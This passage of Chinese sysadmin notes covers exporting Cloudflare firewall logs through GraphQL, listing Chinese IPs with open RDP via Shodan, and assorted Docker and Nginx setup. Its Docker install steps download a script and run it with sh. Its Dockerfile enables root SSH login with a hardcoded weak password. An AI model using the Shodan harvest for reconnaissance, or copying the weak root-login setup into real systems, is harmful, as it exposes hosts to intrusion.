\u770b\u5230\u9632\u706b\u5899\u7684\u62e6\u622a\u65e5\u5fd7\uff0c\u53c8\u53d1\u73b0\u201c\u7ed5\u8fc7\u201d\u8fd9\u4e2aaction\u4e5f\u4f1a\u8bb0\u5f55\u65e5\u5fd7\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7ed5\u8fc7\u672c\u8eab\u5c31\u6ca1\u6709\u542f\u7528\u7684\u9632\u62a4\uff0c\u5c31\u80fd\u8bb0\u5f55\u6240\u6709\u6d41\u91cf\u4e86\u3002\u4f46\u6ce8\u610f\u8fd9\u4e2a\u9632\u706b\u5899\u65e5\u5fd7\u662f\u62bd\u6837\u8bb0\u5f55\u7684\u3002 \u770bF12 Network\u53d1\u73b0\u4eba\u5bb6\u67e5\u8be2\u63a5\u53e3\u7528\u7684\u662fGraphQL\uff0c\u7136\u540e\u53d1\u73b0\u9700\u8981\u901a\u8fc7introspection\u624d\u80fd\u77e5\u9053\u6709\u54ea\u4e9b\u53ef\u7528\u7684\u5b57\u6bb5 cloudflare\u7684\u6587\u6863\uff1a https://developers.cloudflare.com/analytics/graphql-api/getting-started/querying-basics \u5b9e\u9645\u7684introspection\u8bf7\u6c42\uff1a https://stackoverflow.com/questions/34199982/how-to-query-all-the-graphql-type-fields-without-writing-a-long-query \u67e5\u8be2\u9650\u5236\uff1a\u4e00\u6b21\u5206\u9875\u53ef\u4ee5\u83b7\u53d6\u6700\u592710000\u6761\u8bb0\u5f55\uff0cfilter\u5fc5\u987b\u6709\u5185\u5bb9\uff0c\u65f6\u95f4\u8de8\u5ea6\u4e00\u6b21\u4e0d\u80fd\u8d85\u8fc724\u5c0f\u65f6 import requests from pprint import pprint from datetime import timezone , datetime , timedelta sess = requests . session () from config import headers def fetch ( ts ): res = [] end = ts . strftime ( \"%Y-%m- %d T%H:%M:%SZ\" ) start = ( ts - timedelta ( days = 1 )) . strftime ( \"%Y-%m- %d T%H:%M:%SZ\" ) x = sess . post ( \"https://api.cloudflare.com/client/v4/graphql\" , headers = headers , data = '{\"operationName\":\"ActivityLogQuery\",\"variables\":{\"zoneTag\":\"8a4335a74373cec7fd053241dc3e3f41\",\"filter\":{\"datetime_geq\":\"' + start + '\",\"datetime_leq\":\"' + end + '\"},\"limit\":10000,\"activityFilter\":{\"datetime_geq\":\"' + start + '\",\"datetime_leq\":\"' + end + '\"}},\"query\":\"query ActivityLogQuery($zoneTag: string, $filter: FirewallEventsAdaptiveGroupsFilter_InputObject, $activityFilter: FirewallEventsAdaptiveFilter_InputObject, $limit: int64 \\\\ u0021) { viewer { zones(filter: {zoneTag: $zoneTag}) { total: firewallEventsAdaptiveByTimeGroups(limit: 1, filter: $filter) { count avg { sampleInterval __typename } __typename } activity: firewallEventsAdaptive(filter: $activityFilter, limit: $limit, orderBy: [datetime_DESC, rayName_DESC, matchIndex_ASC]) { action clientASNDescription clientAsn clientCountryName clientIP clientRequestHTTPHost clientRequestHTTPMethodName clientRequestHTTPProtocol clientRequestPath clientRequestQuery datetime rayName ruleId source userAgent matchIndex metadata { key value __typename } sampleInterval originResponseStatus edgeResponseStatus clientRefererScheme clientRefererHost clientRefererPath clientRefererQuery clientIPClass __typename } __typename } __typename }}\"}' ) #print(x.json()) return x . json ()[ \"data\" ][ \"viewer\" ][ 'zones' ][ 0 ][ 'activity' ] logformat = [ 'datetime' , 'clientIP' , 'clientIPClass' , 'edgeResponseStatus' , 'originResponseStatus' , 'clientRequestHTTPMethodName' , 'clientRequestPath' , 'clientRequestQuery' , 'clientRequestHTTPProtocol' , 'clientRefererScheme' , 'clientRefererHost' , 'clientRefererPath' , 'clientRefererQuery' , 'userAgent' , 'action' , 'clientASNDescription' , 'clientAsn' , 'clientCountryName' , 'clientRequestHTTPHost' , 'matchIndex' , 'ruleId' , 'sampleInterval' , 'source' , 'rayName' ] fp = open ( \"access.log\" , \"w\" ) ts = datetime . now ( tz = timezone . utc ) knownrays = set () data = None while data is None or len ( data ) == 10000 : data = fetch ( ts ) for i in data : if i [ 'rayName' ] in knownrays : continue line = \" \\t \" . join ( str ( i [ j ]) for j in logformat ) fp . write ( line + \" \\n \" ) last = data [ - 1 ] knownrays . update ([ i [ 'rayName' ] for i in data if i [ 'datetime' ] == last [ 'datetime' ]]) print ( last [ 'datetime' ], \"len(knownrays)=\" , len ( knownrays )) ts = datetime . strptime ( last [ 'datetime' ], \"%Y-%m- %d T%H:%M:%SZ\" ) \u7136\u540e\u5c31\u80fd\u5206\u6790\u4f8b\u5982\u8bbf\u95ee\u6700\u591a\u7684IP: cut -d$'\\t' -f2 access.log|sort|uniq -c|sort -hr|head -n 30","title":"Cloudflare\u514d\u8d39\u8d26\u6237 \u83b7\u53d6\u8bbf\u95ee\u65e5\u5fd7"},{"location":"Developer/#shodan-ip","text":"\u8fd9\u4e2a\u9700\u6c42\u53ea\u9700\u8981\u4f7f\u7528faucet\u5373\u53ef\uff0c\u514d\u8d39 \u4e3e\u4e2a\u4f8b\u5b50\uff1a\u641c\u7d223389\u7684\u4e2d\u56fdip\uff1a https://beta.shodan.io/search/facet?query=port%3A3389+country%3Acn&facet=ip \u4e5f\u53ef\u4ee5\u4f7f\u7528shodan\u7684python\u5305\u6765\u67e5\u8be2\uff0c\u9700\u8981\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5f97\u5230api key\uff1a import shodan x = shodan . Shodan ( \"APIKEY\" ) data = x . search ( \"port:3389 country:cn\" , facets = [ 'ip:10000' ]) iplist = ([ i [ \"value\" ] for i in data [ \"facets\" ][ \"ip\" ]])","title":"shodan \u641c\u7d22\u5f00\u653e\u7279\u5b9a\u7aef\u53e3\u7684ip\u5217\u8868"},{"location":"Docker/","text":"\u642c\u8fd0\u955c\u50cf \u00b6 IMAGE = mysql docker save $ IMAGE | 7 z a - si $ IMAGE . tar . 7 z 7 z x - so $ IMAGE . tar . 7 z | docker load \u5b89\u88c5Docker \u00b6 curl -fsSL https://get.docker.com -o get-docker.sh sh get-docker.sh --mirror Aliyun myubuntu \u57fa\u7840\u955c\u50cf \u00b6 @TAG \u65f6\u533a timezone \u7b80\u5355\u5730\u5c06Docker\u5f53\u6210\u865a\u62df\u673a\u6765\u4f7f\u7528\u7684\u8bdd\uff0c\u81ea\u7136\u8981\u51c6\u5907\u4e2a\u597d\u7528\u7684\u57fa\u7840\u955c\u50cf\u54af \u57fa\u4e8e\u76ee\u524d\u6700\u65b0\u7684ubuntu18.04\uff0c\u914d\u7f6eapt\u6e90\u3001pip\u6e90\u3001\u65f6\u533a\u3001ssh\u5141\u8bb8\u5bc6\u7801\u767b\u5f55 Dockerfile: FROM ubuntu : 18.04 RUN sed - i 's/security.ubuntu.com/mirrors.aliyun.com/g' / etc / apt / sources . list && \\ sed - i 's/archive.ubuntu.com/mirrors.aliyun.com/g' / etc / apt / sources . list # \u4fee\u6539apt\u6e90 RUN apt update && apt install - y ssh curl wget net - tools iputils - ping netcat python3 - pip python - pip nano vim tzdata screen psmisc RUN ln - sf / usr / share / zoneinfo / Asia / Shanghai / etc / localtime # \u4fee\u6539\u65f6\u533a RUN mkdir - p ~/ . pip && echo '[global]\\nindex-url = http://pypi.doubanio.com/simple/\\n[install]\\ntrusted-host=pypi.doubanio.com\\n' > ~/ . pip / pip . conf RUN sed - i 's/prohibit-password/yes/g' / etc / ssh / sshd_config && sed - i 's/#PermitRootLogin/PermitRootLogin/g' / etc / ssh / sshd_config # \u5141\u8bb8root\u7528\u6237\u5bc6\u7801\u767b\u5f55 RUN echo root : badpassword | chpasswd # \u8bb0\u5f97\u4fee\u6539\u8fd9\u91cc\u7684\u5bc6\u7801 ADD run . sh / RUN chmod + x / run . sh CMD / run . sh run.sh: 1 2 3 4 #!/bin/bash service ssh start # \u5728\u5bb9\u5668\u5185\u5b89\u88c5\u4e86mysql\u7b49\u4e4b\u540e\u53ef\u4ee5\u5728run.sh\u8fd9\u91cc\u6dfb\u52a0\u76f8\u5e94\u7684\u542f\u52a8\u547d\u4ee4 sleep infinity build\u547d\u4ee4\uff1a docker build -t myubuntu18 . Install \u5b89\u88c5 \u00b6 \u5efa\u8bae\u53c2\u89c1 \u5982\u4f55\u7ffb\u5899 \uff0c\u90e8\u7f72http proxy \u5b89\u88c5\u4e4b\u524d\uff0c\u5efa\u8bae\u4fee\u6539apt\u6e90 \u5b89\u88c5\u4e4b\u524d\uff0c\u6216\u8bb8\u8981\u5bf9\u5185\u6838\u5347\u7ea7\uff0c\u5982\u679c\u6267\u884c\u5b89\u88c5\u811a\u672c\u53d1\u51fa\u4e86\u5bf9aufs\u7684\u8b66\u544a\uff0c\u8bf7\u5148\u770b\u4e0b\u9762\u7684 \u89e3\u51b3aufs\u7684\u95ee\u9898 \u5b89\u88c5\u547d\u4ee4\uff1a curl -fsSL get.docker.com -o get-docker.sh sh get-docker.sh --mirror Aliyun \u5176\u4e2d\u6700\u540e\u4e00\u6b65\u7684apt-get install docker-engine\u8017\u65f6\u8f83\u957f\uff0c\u770b\u8d77\u6765\u5f88\u50cf\u5361\u6b7b\uff0c\u9700\u8981\u8010\u5fc3\u7b49\u5f85 \u5b89\u88c5\u540e\u6267\u884cdocker version\uff0c\u6ca1\u6709\u62a5\u9519\u5373\u53ef \u89e3\u51b3aufs\u7684\u95ee\u9898 \u00b6 apt-get install lxc wget bsdtar curl apt-get install linux-image-extra-$(uname -r) modprobe aufs \u52a0\u901f\u955c\u50cf\u4e0b\u8f7d \u00b6 \u5728\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u68c0\u67e5docker\u7684\u7248\u672c\uff1a docker -v \u5982\u679c\u4f60\u7684docker\u7248\u672c\u4e3a1.6.2,\u8bf7\u53c2\u8003\u4e0b\u65b9 \u5378\u8f7ddocker \u5efa\u8bae\u4f7f\u7528\u963f\u91cc\u4e91\u7684\u955c\u50cf\u6e90 \u00b6 sudo mkdir - p / etc / docker sudo tee / etc / docker / daemon . json <<- 'EOF' { \"registry-mirrors\" : [ \"https://h0kyslzs.mirror.aliyuncs.com\" ] } EOF sudo systemctl daemon - reload sudo systemctl restart docker \u53e6\u5916\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528USTC\u7684\u955c\u50cf\u6e90\uff1a\u53c2\u8003 https://lug.ustc.edu.cn/wiki/mirrors/help/docker Docker\u65e7\u7248\u672c\u5378\u8f7d \u00b6 \u5982\u679c\u4f60\u7684docker\u662f\u4f7f\u7528apt-get install docker.io\u5b89\u88c5\u7684\uff0c\u5148\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5378\u8f7d\uff1a apt - get remove docker . io apt - get autoremove rm - rf / var / lib / docker \u7136\u540e\u5c31\u53ef\u4ee5\u6267\u884c\u5b89\u88c5\u547d\u4ee4\u4e86 \u83b7\u5f97\u5bb9\u5668\u7684ip \u00b6 @TAG getip alias getip=\"docker inspect --format ' {{ .NetworkSettings.IPAddress }} ' \" getip \u5bb9\u5668\u540d\u79f0 \u8fd9\u79cd\u65b9\u6848\u5bf9macvlan\u7684\u5bb9\u5668\u4e0d\u9002\u7528\uff0c\u53c2\u89c1 \u83b7\u53d6macvlan\u5bb9\u5668\u7684IP \u5bfc\u51fa\u5bfc\u5165 \u00b6 \u642c\u8fd0\u955c\u50cf\u2013save\u5bfc\u51fa\u955c\u50cf \u00b6 \u7531\u4e8e\u7f51\u7edc\u5e26\u5bbd(\u6d41\u91cf)\u5f80\u5f80\u662f\u74f6\u9888\u8d44\u6e90\uff0c\u6240\u4ee5\u4ea7\u751f\u66f4\u5c0f\u7684\u538b\u7f29\u6587\u4ef6\u5f88\u6709\u5fc5\u8981\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u751f\u6210 tar.7z \u6587\u4ef6\uff1a apt-get install -y p7zip-full docker save \u955c\u50cf\u540d\u79f0 | 7z a -si \u5bfc\u51fa\u6587\u4ef6\u540d.tar.7z \u8fd9\u662f\u751f\u6210tar.gz\u6587\u4ef6\uff1a docker save \u955c\u50cf\u540d\u79f0 | gzip >\u5bfc\u51fa\u6587\u4ef6\u540d.tar.gz \u642c\u8fd0\u955c\u50cf\u2013load\u8f7d\u5165\u955c\u50cf \u00b6 \u5982\u679c\u662f tar.7z \u6587\u4ef6\uff0c\u9700\u8981\u8c03\u7528 7z \u547d\u4ee4\u89e3\u538b\uff1a 7 z x - so \u6587\u4ef6\u540d . tar . 7 z | docker load \u5982\u679c\u662f tar.gz \u6587\u4ef6\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f7d\u5165\uff1a docker load < \u6587\u4ef6\u540d . tar . gz Export\u5bfc\u51fa\u5bb9\u5668 \u5e76\u4e0d\u5e38\u7528 \u00b6 \u76f4\u63a5\u5bfc\u51fa\u5bb9\u5668\u5e76\u4e0d\u5e38\u7528\uff0c\u5efa\u8bae docker commit \u5bb9\u5668\u540d\u79f0 \u4fdd\u5b58\u6210\u7684\u955c\u50cf\u540d\u79f0 \uff0c\u7136\u540e\u5bfc\u51fa\u955c\u50cf \u5bfc\u51fa\u5bb9\u5668\u5f97\u5230\u7684\u662ftar\u6587\u4ef6\uff0c\u6ca1\u6709\u8fdb\u884c\u538b\u7f29\uff0c\u6211\u4eec\u9700\u8981\u624b\u52a8\u6267\u884c\u538b\u7f29 docker export \u5bb9\u5668\u7684\u540d\u79f0\u6216 ID | gzip > \u5bfc\u51fa\u6587\u4ef6\u540d . tar . gz Import\u5bfc\u5165\u5bb9\u5668 \u00b6 \u867d\u7136\u4e0a\u4e00\u6b65\u6211\u4eec\u538b\u7f29\u4e86\uff0c\u4f46docker\u53ef\u4ee5\u76f4\u63a5import\uff0c\u4e0d\u9700\u8981\u7528gunzip docker import \u6587\u4ef6\u540d \u89e3\u51b3iptables failed - No chian/target/match by that name \u00b6 \u5982\u679cdocker\u5b89\u88c5\u7684\u65f6\u5019\u6ca1\u6709\u81ea\u52a8\u628a\u9700\u8981\u7684\u89c4\u5219\u94fe\u52a0\u4e0a\uff0c\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0 iptables -t nat -N DOCKER iptables -t filter -N DOCKER \u9644\uff1a\u5982\u679c\u9700\u8981\u5220\u9664\u94fe\u6761\uff0c\u53ef\u4ee5\u7528 iptables-save \u5bfc\u51fa\u540e\u624b\u52a8\u7f16\u8f91\u540e iptables-restore \u8fc1\u79fbDocker\u6587\u4ef6\u5939\u5230\u5176\u4ed6\u786c\u76d8 \u00b6 \u5f53\u955c\u50cf\u591a\u4e86\u8d77\u6765\u7684\u65f6\u5019\uff0c/var/lib\u6240\u5728\u7684\u78c1\u76d8\u5206\u533a\u5f88\u53ef\u80fd\u88ab\u5360\u6ee1\uff0c\u8fd9\u65f6\u5019\u8981\u8003\u8651\u8fc1\u79fb\u5230\u5176\u4ed6\u786c\u76d8\uff0c\u6b64\u5904\u4ee5\u8fc1\u79fb\u5230 /home/docker \u4e3a\u4f8b\u8bf4\u660e # \u9996\u5148\u8bb0\u5f97\u5173\u95ed\u670d\u52a1 service docker stop mv /var/lib/docker /home/ # \u7136\u540e\u4fee\u6539\u670d\u52a1\u914d\u7f6e\u6587\u4ef6/etc/default/docker\uff0c\u6b64\u5904\u5efa\u8bae\u624b\u52a8vim\u7f16\u8f91\uff0c\u5728\u542f\u52a8\u53c2\u6570\u4e2d\u52a0\u5165\u8fd9\u4e2a\uff1a # --graph='/home/docker' echo -e \"\\nDOCKER_OPTS=\\\"--graph='/home/docker'\\\"\" >> /etc/default/docker \u89e3\u51b3debian\u7b49\u5bb9\u5668\u6ca1\u6709ifconfig,killall\u7684\u95ee\u9898 \u00b6 apt - get install net - tools psmisc \u8bbe\u7f6e\u5bb9\u5668\u4f4e\u6743\u9650\u7528\u6237\u8fd0\u884c \u00b6 @TAG user \u5b89\u5168\u6700\u4f73\u5b9e\u8df5 \u5728Dockerfile\u4e2d\u52a0\u5165 User nobody \u5bb9\u5668\u8fd0\u884c\u540eexec\u8fdb\u53bb\u9ed8\u8ba4\u662fnobody\u7528\u6237\uff0c\u5e76\u4e0d\u80fdsu\u5565\u7684\uff0c\u8fd9\u65f6\u5019exec\u9700\u8981\u5e26\u53c2\u6570-u\u8868\u793a\u7528\u6307\u5b9a\u7528\u6237\u8eab\u4efd\u8fdb\u5165\u5bb9\u5668\uff1a docker exec -i -t -u root \u5bb9\u5668\u540d\u79f0 /bin/bash \u8bbe\u7f6e\u5bb9\u5668/etc/resolv.conf\u548c/etc/hosts \u00b6 \u5728\u5bb9\u5668\u4e2d\u8fd9\u4e24\u4e2a\u6587\u4ef6\u662f\u4ee5mount\u5f62\u5f0f\u6302\u8f7d\u7684\uff0c\u4e0d\u80fdunmount\uff1b\u5373\u4f7f\u8fdb\u884c\u4fee\u6539\uff0c\u5bb9\u5668\u91cd\u542f\u540e\u4fee\u6539\u5c31\u4e22\u5931\u4e86 \u5176\u5b9e\u8fd9\u4e24\u4e2a\u6587\u4ef6\u5e94\u8be5\u5728\u5bb9\u5668\u521b\u5efa\u7684\u65f6\u5019\u6307\u5b9a\u53c2\u6570 --dns \u548c --add-host \u6765\u52a0\u4ee5\u63a7\u5236\uff1a docker run -d --dns 114.114.114.114 --add-host example.com:1.2.3.4 \u5bb9\u5668\u540d\u79f0 \u5bb9\u5668\u9650\u5236\u53c2\u6570\u8bbe\u7f6e \u00b6 \u5f53\u5bb9\u5668\u662f\u5f00\u653e\u7ed9\u4e0d\u53ef\u4fe1\u57df\u7684\u65f6\u5019(\u5982\u90e8\u7f72\u4e00\u4e2aCTF\u7684pwn\u9898\u76ee)\uff0c\u867d\u7136\u5bb9\u5668\u9003\u90380-day\u6211\u4e5f\u6ca1\u529e\u6cd5\uff0c\u4f46\u9650\u5236\u4e00\u4e0b\u5bb9\u5668\u8d44\u6e90\u5360\u7528\u9632\u6b62\u6405\u5c4e\u4e5f\u662f\u5f88\u6709\u5fc5\u8981\u7684 --cpu-shares 512 --cpu-period=100000 --cpu-quota=50000 --memory 104857600 --ulimit=nofile=65536 --pids-limit=200 --blkio-weight=512 --restart=\"always\" \u6548\u679c\u7b80\u4ecb\uff1a\u5982\u4e0a\u914d\u7f6e\u6700\u591a\u5360\u7528 50% \u5355\u4e2a CPU \uff0c\u6700\u591a\u5360\u7528100MB\u7269\u7406\u5185\u5b58\uff0c\u5bb9\u5668\u5185\u8fdb\u7a0b\u6570\u76ee\u6700\u591a200\u4e2a --cpu-shares \u8868\u793a\u76f8\u5bf9\u5229\u7528\u5360\u6bd4\uff0c\u4e0d\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u503c\u4e3a1024\uff0c\u5355\u4e2aCPU\u662f1024\uff0c\u53ea\u6709\u5f53\u5bb9\u5668\u8bd5\u56fe\u5360\u7528100%\u7684CPU\u65f6\u624d\u4f1a\u4f53\u73b0\u4f5c\u7528\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a From: http://blog.opskumu.com/docker-cpu-limit.html \u5047\u5982\u4e00\u4e2a 1core \u7684\u4e3b\u673a\u8fd0\u884c 3 \u4e2a container\uff0c\u5176\u4e2d\u4e00\u4e2a cpu-shares \u8bbe\u7f6e\u4e3a 1024\uff0c\u800c\u5176\u5b83 cpu-shares \u88ab\u8bbe\u7f6e\u6210 512\u3002\u5f53 3 \u4e2a\u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\u5c1d\u8bd5\u4f7f\u7528 100% CPU \u7684\u65f6\u5019\u300c\u5c1d\u8bd5\u4f7f\u7528 100% CPU \u5f88\u91cd\u8981\uff0c\u6b64\u65f6\u624d\u53ef\u4ee5\u4f53\u73b0\u8bbe\u7f6e\u503c\u300d\uff0c\u5219\u8bbe\u7f6e 1024 \u7684\u5bb9\u5668\u4f1a\u5360\u7528 50% \u7684 CPU \u65f6\u95f4\uff0c\u5176\u4ed6\u4e24\u4e2a\u5bb9\u5668\u5219\u53ea\u80fd\u5206\u522b\u5360\u7528\u5230 25% \u7684 CPU \u65f6\u95f4\u3002 \u5982\u679c\u4e3b\u673a\u662f 3core\uff0c\u8fd0\u884c 3 \u4e2a\u5bb9\u5668\uff0c\u4e24\u4e2a cpu-shares \u8bbe\u7f6e\u4e3a 512\uff0c\u4e00\u4e2a\u8bbe\u7f6e\u4e3a 1024\uff0c\u5219\u6b64\u65f6\u6bcf\u4e2a container \u90fd\u80fd\u5360\u7528\u5176\u4e2d\u4e00\u4e2a CPU \u4e3a 100%\u3002 --cpu-period \u8868\u793a\u6309\u591a\u5c11\u79d2\u5206\u7247\uff0c\u4f8b\u5982\u8bbe\u7f6e\u4e3a100000\u5c31\u662f\u6309100ms\u5206\u5272\uff0c\u540c\u65f6\u8bbe\u7f6e --cpu-quota \u4e3a50000\u5c31\u662f50ms\uff0c\u6548\u679c\u662f\u540c\u65f6\u53ea\u80fd\u4f7f\u75280.5\u4e2aCPU --memory \u9650\u5236\u5bb9\u5668\u4f7f\u7528\u7684\u7269\u7406\u5185\u5b58\uff0c\u5f53\u5bb9\u5668\u8d85\u51fa\u65f6\uff0c\u5176\u4e2d\u7684\u8fdb\u7a0b\u4f1a\u88abkill\uff0c\u8be6\u7ec6\u8bf7\u53c2\u8003http://blog.opskumu.com/docker-memory-limit.html --blkio-weight \u8868\u793aIO\u76f8\u5bf9\u6743\u91cd\uff0c\u8be6\u7ec6\u8bf7\u53c2\u8003 http://blog.opskumu.com/docker-io-limit.html \u5feb\u901f\u90e8\u7f72ftp \u00b6 @TAG vsftpd vsftpd\u7684\u914d\u7f6e\u771f\u662f\u8ba9\u4eba\u5934\u75bc\uff0c\u4e0d\u5982 docker search ftp \u4e00\u756a\uff0c\u7136\u540egoogle\u4e00\u4e0b\u627e\u5230\u5bf9\u5e94\u7684 Docker Hub\u9875\u9762 \u4f7f\u7528\u6b65\u9aa4\uff1a docker run -d --name ftpd_server -p 21:21 -p 30000-30009:30000-30009 -e \"PUBLICHOST=localhost\" -v /path/to/the_ftp_directory:/data stilliard/pure-ftpd:hardened docker exec -it ftpd_server /bin/bash #\u8fdb\u5165\u5bb9\u5668\u540e\u521b\u5efa\u7528\u6237 pure-pw useradd bob -f /etc/pure-ftpd/passwd/pureftpd.passwd -m -u ftpuser -d /data \u5feb\u901f\u90e8\u7f72wordpress \u00b6 @TAG sub_filter \u60f3\u642d\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684blog\uff0c\u9009\u62e9\u73a9\u4e00\u73a9wordpress\u54af\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\u5b8c\u6574\u7684\u6d41\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u53ca\u89e3\u51b3\u65b9\u6848 \u6280\u672f\u76f8\u5173\uff1a Docker Nginx HTTPS \u76ee\u6807\uff1a \u5feb\u901f\u642d\u5efa\u4e00\u4e2a\u5168\u7ad9https\u7684wordpress\u7ad9\u70b9\uff0c\u57df\u540d\u4e3aexample.com \u5b8c\u6574\u6d41\u7a0b\uff1a \u00b6 \u524d\u671f\u51c6\u5907:\u57df\u540d+vps \u6ce8\u518c\u57df\u540d \u5982\u679c\u9762\u5411\u56fd\u5185\u8bbf\u95ee\uff0c\u8fd8\u9700\u8981\u5907\u6848\u54af\uff1b\u522b\u5fd8\u4e86\u914d\u7f6eDNS\u89e3\u6790 \u4e70\u4e2avps\u670d\u52a1\u5668\uff0c\u5efa\u8bae\u9009\u62e9\u9999\u6e2fvps \u5b89\u88c5Docker\u548cNginx curl -fsSL https://get.docker.com -o get-docker.sh sh get-docker.sh --mirror Aliyun apt-get install -y nginx \u542f\u52a8\u4e00\u4e2amysql\u7684\u955c\u50cf\uff1a # Google\u641c\u7d22\u5173\u952e\u8bcd \"docker mysql\" docker run --name mysql -e MYSQL_ROOT_PASSWORD=\u8fd9\u91cc\u6539\u6210\u4f60\u60f3\u8bbe\u7f6e\u7684\u5bc6\u7801 -d mysql # Google\u641c\u7d22\u5173\u952e\u8bcd \"docker wordpress\" docker run --name wp --link mysql:mysql -p 6666:80 -d wordpress \u57df\u540dhttps\u8bc1\u4e66\u83b7\u53d6\u4ee5\u53ca\u542f\u7528https\u8bbf\u95ee\uff0c\u6b64\u90e8\u5206\u5177\u4f53\u89c1 Nginx.md \u4e2d \u83b7\u5f97Let's encrypt\u514d\u8d39https\u8bc1\u4e66 \u548c \u914d\u7f6e\u5b89\u5168\u7684https \u90e8\u5206 \u914d\u7f6eNginx\uff0c\u5b8c\u6574\u914d\u7f6e\u5982\u4e0b\uff1a server { server_name *. example . com example . com ; location /. well - known / acme - challenge { #\u8fd9\u662flet's encrypt\u7533\u8bf7\u8bc1\u4e66\u7684\u65f6\u5019\u7528\u5230\u7684\u76ee\u5f55 alias / tmp / acme / ; try_files $ uri = 404 ; } location / { rewrite ^ https : //$ host $ request_uri ? permanent ; } } server { server_name *. example . com example . com ; include https . conf ; access_log / var / log / nginx / example_access . log ; error_log / var / log / nginx / example_error . log ; ssl_certificate / home / keys / example . crt ; ssl_certificate_key / home / keys / example . key ; location / { proxy_pass http : // 127.0 . 0.1 : 6666 ; proxy_set_header Host $ host ; proxy_set_header Accept - Encoding \"\" ; #\u7981\u6b62\u540e\u7aef\u8fd4\u56degzip\u5185\u5bb9\uff0c\u4fdd\u8bc1\u80fd\u591f\u66ff\u6362 sub_filter_once off ; #\u591a\u6b21\u66ff\u6362 \u4e0d\u53ea\u662f\u66ff\u6362\u4e00\u6b21 sub_filter \"http://www.example.com\" \"https://www.example.com\" ; } } \u9047\u5230\u7684\u5751 \u00b6 docker run\u7684\u65f6\u5019\u5fd8\u8bb0-p\u53c2\u6570 \u5efa\u8bae\u8fd8\u662f\u628a\u7aef\u53e3\u6620\u5c04\u51fa\u6765\uff0c\u5728\u5bb9\u5668\u91cd\u542f\u540e\u5bb9\u5668\u7684\u5185\u7f51IP\u662f\u4f1a\u53d1\u751f\u53d8\u5316\u7684\uff0c\u4e0d\u9002\u5408\u5c06172.17.0.*\u8fd9\u79cdIP\u5199\u5165nginx\u914d\u7f6e \u6b64\u65f6\u6211\u9009\u62e9\u4e86 docker rm -f \u5bb9\u5668ID \u5f3a\u5236\u5220\u6389\u5bb9\u5668\uff0c\u518d\u52a0\u4e0a-p\u53c2\u6570\u540e\u542f\u52a8 \u5168\u7ad9https \u867d\u7136\u6211\u7684https.conf\u4e2d\u5b9a\u4e49\u4e86HSTS\uff0c\u6d4f\u89c8\u5668\u4e5f\u786e\u5b9e\u4f1a\u628a\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u81ea\u52a8\u7528https\u534f\u8bae\u8bbf\u95ee\uff0c\u4f46\u662f\u8fd8\u662f\u7531\u4e8eform\u7684action\u4e3ahttp\u534f\u8bae\u800c\u8b66\u544a\u4e0d\u5b89\u5168(\u5728Chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u7684Console\u770b\u5230)\uff0c\u4e5f\u6ca1\u6709\u5c0f\u7eff\u9501\u663e\u793a\u3002\u6240\u4ee5\u8981\u4fdd\u8bc1\u670d\u52a1\u5668\u8f93\u51fa\u7ed9\u6d4f\u89c8\u5668\u7684\u5185\u5bb9\u5c31\u662fhttps\u7684\u94fe\u63a5 \u4e00\u5f00\u59cb\u9009\u62e9\u4e86\u5b98\u65b9wordpress\u7684\u65b9\u6cd5(Google\u5173\u952e\u8bcd\u201dwordpress https\u201d)\uff0c\u7ed3\u679c\u5bfc\u81f4\u4e86\u4e0b\u6587\u7b2c\u4e09\u70b9\u7684\u6298\u817e \u6700\u7ec8\u9009\u62e9\u7684\u65b9\u6848\u662f\u5728nginx\u53cd\u5411\u4ee3\u7406\u7684\u65f6\u5019\u66ff\u6362\u6587\u672c\u5185\u5bb9\uff0c\u4f7f\u7528sub_filter\u8fd9\u4e2a\u6a21\u5757\u8fdb\u884c\u6587\u672c\u5185\u5bb9\u66ff\u6362 \u9047\u5230\u4e86\u95ee\u9898\uff0c\u8fd9\u4e2asub_filter\u4e0d\u8d77\u4f5c\u7528\uff0c(Google\u5173\u952e\u8bcd \u201csub_filter not working\u201d)\u539f\u56e0\u662f\u5bb9\u5668\u8fd4\u56de\u7684\u5185\u5bb9\u542f\u7528\u4e86gzip\uff0c\u65e0\u6cd5\u66ff\u6362\uff0c\u65b9\u6cd5\u662f\u52a0\u5165\u4e00\u884c\u914d\u7f6e\u7981\u6b62\u5bb9\u5668\u7684Apache\u4f7f\u7528gzip: proxy_set_header Accept-Encoding \u201c\u201d; \u53c2\u8003\uff1a http://stackoverflow.com/questions/31893211/http-sub-module-sub-filter-of-nginx-and-reverse-proxy-not-working \u7531\u4e8e\u5728\u540e\u53f0\u4fee\u6539\u4e86Wordpress Address\u548cSite Address\u6539\u4e3ahttps\u7684\u94fe\u63a5\uff0c\u5bfc\u81f4\u540e\u53f0\u65e0\u6cd5\u6253\u5f00\uff0c\u91cd\u5b9a\u5411\u6b7b\u5faa\u73af \u89e3\u51b3\u65b9\u6848\u662f\u8fdb\u5165mysql\u5bb9\u5668\u624b\u52a8\u4fee\u6539\uff0c\u628a\u8fdb\u884c\u7684\u4fee\u6539\u6539\u56de\u53bb \u95ee\u9898\u5728\u4e8e\u6211\u4e5f\u5e76\u4e0d\u77e5\u9053\u6539\u4e86\u5565\uff0c\u5728\u7ec8\u7aefmysql select * from wp_options; \u6709\u4e9b\u884c\u592a\u957f\u5bfc\u81f4\u5173\u952e\u5185\u5bb9\u5237\u5c4f\u800c\u8fc7\uff0c\u4e0d\u65b9\u4fbf\u67e5\u770b\u8868 \u6211\u7684\u65b9\u6cd5\u662f\u5148 mysqldump -p\u5bc6\u7801 wordpress >test.sql 